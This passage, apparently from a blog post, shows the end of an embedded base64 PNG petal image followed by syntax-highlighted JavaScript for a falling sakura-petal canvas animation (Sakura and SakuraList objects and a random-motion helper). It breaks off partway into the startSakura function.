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"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">Sakura</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token punctuation">,</span> r<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>s <span class="token operator">=</span> s<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>r <span class="token operator">=</span> r<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>fn <span class="token operator">=</span> fn<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
Sakura<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>draw <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>cxt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    cxt<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> xc <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">*</span> <span class="token keyword">this</span><span class="token punctuation">.</span>s <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>
    cxt<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cxt<span class="token punctuation">.</span><span class="token function">rotate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cxt<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span> <span class="token operator">*</span> <span class="token keyword">this</span><span class="token punctuation">.</span>s<span class="token punctuation">,</span> <span class="token number">40</span> <span class="token operator">*</span> <span class="token keyword">this</span><span class="token punctuation">.</span>s<span class="token punctuation">)</span>
    cxt<span class="token punctuation">.</span><span class="token function">restore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
Sakura<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>update <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>r <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">></span> window<span class="token punctuation">.</span>innerWidth <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">></span> window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>r <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'fnr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>r <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>r <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
SakuraList <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
SakuraList<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>push <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>sakura<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sakura<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
SakuraList<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>update <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
SakuraList<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>draw <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>cxt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
SakuraList<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token keyword">get</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
SakuraList<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getRandom</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> ret<span class="token punctuation">,</span> random<span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">'x'</span><span class="token punctuation">:</span>
            ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'y'</span><span class="token punctuation">:</span>
            ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>
            ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'r'</span><span class="token punctuation">:</span>
            ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'fnx'</span><span class="token punctuation">:</span>
            random <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0.5</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">;</span>
            ret <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> x <span class="token operator">+</span> <span class="token number">0.5</span> <span class="token operator">*</span> random <span class="token operator">-</span> <span class="token number">1.7</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'fny'</span><span class="token punctuation">:</span>
            random <span class="token operator">=</span> <span class="token number">1.5</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.7</span>
            ret <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> y <span class="token operator">+</span> random<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'fnr'</span><span class="token punctuation">:</span>
            random <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.03</span><span class="token punctuation">;</span>
            ret <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> r <span class="token operator">+</span> random<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">startSakura</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    requestAnimationFrame <span class="token operator">=</span> window<span class="token punctuation">.</span>requestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>mozRequestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>webkitRequestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>msRequestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>oRequestAnimationFrame<span class="token punctuation">;</span>
    <span class="token keyword">var</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'canvas'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        cxt<span class="token punctuation">;</span>
